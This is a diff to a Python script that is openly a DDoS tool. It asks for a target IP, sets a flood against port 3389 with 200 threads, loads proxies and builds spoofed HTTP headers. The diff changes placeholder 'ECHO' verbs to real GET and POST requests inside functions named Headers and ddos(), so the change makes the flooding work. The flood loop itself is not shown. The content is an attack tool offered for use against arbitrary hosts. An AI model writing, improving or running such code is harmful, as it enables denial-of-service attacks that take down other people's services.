@@ -2377,7 +2377,7 @@ ip = str(input("IP:"))
 port = int("3389")
 method = str("TCP")
 times = int("50000")
-threads = int("500")
+threads = int("200")
 time.sleep(5)
 print("[0] Checking IP ..........")
 print("Attack Send TO " + ip)
@@ -2405,9 +2405,9 @@ def get_proxies():
 def Headers(method):
     header = "UDP"
     if method == "UDP" or method == "TCP" or method == "HTTP":
-        get_host = "ECHO HTTP/1.1\r\nHost: " + ip + "\r\n"
-        post_host = "ECHO HTTP/1.1\r\nHost: " + ip + "\r\n"
-        get_data = "ECHO https://check-host.net//1.1\r\nHost: " + ip + "\r\n"
+        get_host = "GET HTTP/1.1\r\nHost: " + ip + "\r\n"
+        post_host = "POST HTTP/1.1\r\nHost: " + ip + "\r\n"
+        get_data = "GET https://check-host.net//1.1\r\nHost: " + ip + "\r\n"
         referer = "Referer: " + random.choice(referers) + ip + "\r\n"
         connection = "Connection: Keep-Alive\r\n" + "\r\n"
         content = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
@@ -2429,9 +2429,9 @@ def Headers(method):
     return header
 
 def ddos():
-    get_host = "ECHO HTTP/1.1\r\nHost: " + ip + "\r\n"
-    post_host = "ECHO HTTP/1.1\r\nHost: " + ip + "\r\n"
-    get_data = "ECHO https://check-host.net//1.1\r\nHost: " + ip + "\r\n"
+    get_host = "GET HTTP/1.1\r\nHost: " + ip + "\r\n"
+    post_host = "POST HTTP/1.1\r\nHost: " + ip + "\r\n"
+    get_data = "GET https://check-host.net//1.1\r\nHost: " + ip + "\r\n"
     referer = "Referer: " + random.choice(referers) + ip + "\r\n"
     connection = "Connection: Keep-Alive\r\n" + "\r\n"
     proxies = open("proxies.txt", 'r').read().split('\n')
